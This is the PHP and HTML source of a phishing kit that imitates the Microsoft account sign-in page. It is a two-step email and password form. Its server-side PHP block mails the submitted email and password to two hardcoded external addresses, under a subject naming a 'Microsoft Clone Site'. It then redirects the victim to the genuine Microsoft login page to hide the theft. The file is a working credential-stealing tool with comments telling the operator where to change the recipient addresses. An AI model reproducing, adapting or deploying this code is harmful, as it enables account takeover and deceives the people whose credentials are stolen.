<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Theme Made By www.w3schools.com -->
  <title>Sign in to your Microsoft account</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
  <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>

<?php
 
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "ospencer404@gmail.com"; //Change email here
    $to2 = "tteerrgg@yandex.com"; //Change email here
    $from = $_REQUEST['email']; 
    $password = $_REQUEST['password']; 
    $headers = "From: $from"; 
    $subject = "New Credentials From Your Microsoft Clone Site"; 
 
    $fields = array(); 
    $fields{"email"} = "email"; 
    $fields{"password"} = "password"; 
 
    $body = "Here is the account details:\n\n"; foreach($fields as $a => $b){   $body .= sprintf("%20s: %s\n",$b,$_REQUEST[$a]); }
 
    $send = mail($to, $subject, $body, $headers);

    $send = mail($to2, $subject, $body, $headers);

    echo '<script>window.location.href = "https://login.live.com";</script>';
  }
?>  

<div class="jumbotron text-center">
	<div class="contain">
		<div>
			<img src="images/microsoft.svg" align="left">
		</div>
    <form name="myForm" role="form" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="post" id="contact-form">
		<br>
      <div class="page slidepage">
		  	<h3>Sign in</h3>
        <p class="error">Enter a valid email address, phone number or Skype name.</p>
		    <div class="">
		      <input name="email" type="text" class="form-control" id="email" placeholder="Email, Phone or Skype" required>
		      <br>
		      <p>No account? <a href="#">Create one!</a></p>
		      <p><a href="#">Sign in with Windows Hello or a security key <img src="images/question.svg"></a></p>
		      <div class="">
		        <button type="button" class="btn btn-primary nextBtn">Next</button>
		      </div>
		    </div>
      </div>

      <div class="page">
        <h3>Enter Password</h3>
        <div class="">
          <input type="password" class="form-control" id="password" name="password" placeholder="Password">
          <br>
          <p><a href="#">Forgotten your password?</a></p>
          <p><a href="#">Sign in with Windows Hello or a security key</a></p>
          <div class="">
            <button type="Submit" class="btn btn-primary">Submit</button>
          </div>
        </div>
      </div>

		</form>
	</div>


<!--   <button type="button" class="btn signin"><img src="images/key.svg"> Sign-in options</button> -->
</div>

<!-- 	<div class="contain2">
		<div>
		  	<p>Sign in options</p>
		</div>
	</div> -->

  <script src="js/script.js"></script>

</body>
</html>
